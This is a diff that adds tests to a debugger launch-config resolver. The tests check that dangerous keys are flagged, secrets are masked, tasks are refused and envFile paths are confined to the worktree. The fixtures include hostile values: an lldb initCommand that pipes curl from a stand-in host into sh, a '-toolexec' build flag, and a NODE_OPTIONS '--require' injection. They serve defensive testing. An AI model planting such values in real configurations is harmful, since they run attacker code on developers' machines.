@@ -490,6 +490,90 @@ describe('resolveLaunchSpec', () => {
     expect(JSON.stringify(spec.runs)).not.toContain('hunter2')
   })
 
+  it('shows and flags every key the adapter receives, including initCommands', async () => {
+    const root = worktreeWith(
+      launchJson({
+        name: 'Attach',
+        type: 'lldb-dap',
+        request: 'attach',
+        pid: 1234,
+        initCommands: ['platform shell curl https://x.example/p | sh'],
+        buildFlags: '-toolexec=x',
+        env: { API_KEY: 'secret' }
+      })
+    )
+    const { runs } = await resolveOk({ worktreePath: root, configName: 'Attach' })
+    const keys = Object.fromEntries(runs.allKeys.map((k) => [k.name, k]))
+    const names = runs.allKeys.map((k) => k.name)
+    expect(names).toEqual([...names].sort())
+    expect(keys.initCommands).toEqual({
+      name: 'initCommands',
+      value: '["platform shell curl https://x.example/p | sh"]',
+      dangerous: true
+    })
+    expect(keys.buildFlags.dangerous).toBe(true)
+    expect(keys.pid).toEqual({ name: 'pid', value: '1234', dangerous: false })
+    expect(keys.env.value).toBe('{"API_KEY":"••••••"}')
+    expect(JSON.stringify(runs)).not.toContain('secret')
+    const node = worktreeWith(launchJson({ name: 'N', type: 'node', request: 'launch' }))
+    const nodeRuns = (await resolveOk({ worktreePath: node, configName: 'N' })).runs
+    expect(nodeRuns.allKeys.map((k) => k.name)).not.toContain('__workspaceFolder')
+  })
+
+  it('refuses preLaunchTask and postDebugTask by name', async () => {
+    const root = worktreeWith(
+      launchJson(
+        { name: 'Pre', type: 'node', request: 'launch', preLaunchTask: 'build' },
+        { name: 'Post', type: 'node', request: 'launch', postDebugTask: 'clean' }
+      )
+    )
+    for (const configName of ['Pre', 'Post']) {
+      const result = await resolveLaunchSpec({ worktreePath: root, configName })
+      expect(result).toMatchObject({ ok: false, reason: 'unsupported-request' })
+      expect(!result.ok && result.message).toContain('tasks are not supported')
+    }
+    const listed = await listLaunchConfigs(root)
+    expect(listed.ok && listed.configs.every((c) => !c.runnable)).toBe(true)
+  })
+
+  it('shows envFile entries masked and hashes its text, so an edit needs a new confirmation', async () => {
+    const root = worktreeWith(
+      launchJson({ name: 'N', type: 'node', request: 'launch', envFile: '${workspaceFolder}/.env' })
+    )
+    writeFileSync(join(root, '.env'), '# comment\nexport API_TOKEN="t"\nPLAIN=v\n')
+    const first = await resolveOk({ worktreePath: root, configName: 'N' })
+    expect(first.runs.envFileEntries).toEqual([
+      { name: 'API_TOKEN', value: '••••••', masked: true, dangerous: false },
+      { name: 'PLAIN', value: 'v', masked: false, dangerous: false }
+    ])
+    writeFileSync(join(root, '.env'), 'NODE_OPTIONS=--require ./x.js\n')
+    const edited = await resolveOk({ worktreePath: root, configName: 'N' })
+    expect(edited.configHash).not.toBe(first.configHash)
+    expect(edited.runs.envFileEntries).toEqual([
+      { name: 'NODE_OPTIONS', value: '--require ./x.js', masked: false, dangerous: true }
+    ])
+  })
+
+  it('refuses an envFile outside the worktree, a symlink, a missing or an oversized one', async () => {
+    const outside = tempDir()
+    writeFileSync(join(outside, 'x.env'), 'A=1\n')
+    const root = worktreeWith(
+      launchJson(
+        { name: 'Out', type: 'node', request: 'launch', envFile: join(outside, 'x.env') },
+        { name: 'Dots', type: 'node', request: 'launch', envFile: '../x.env' },
+        { name: 'Link', type: 'node', request: 'launch', envFile: 'link.env' },
+        { name: 'Gone', type: 'node', request: 'launch', envFile: 'gone.env' },
+        { name: 'Big', type: 'node', request: 'launch', envFile: 'big.env' }
+      )
+    )
+    symlinkSync(join(outside, 'x.env'), join(root, 'link.env'))
+    writeFileSync(join(root, 'big.env'), `A=${'x'.repeat(64 * 1024)}\n`)
+    for (const configName of ['Out', 'Dots', 'Link', 'Gone', 'Big']) {
+      const result = await resolveLaunchSpec({ worktreePath: root, configName })
+      expect(result, configName).toMatchObject({ ok: false, reason: 'malformed' })
+    }
+  })
+
   it.skipIf(process.platform === 'win32')('names the adapter binary that will run', async () => {
     const bin = tempDir()
     writeFileSync(join(bin, 'dlv'), '#!/bin/sh\n')
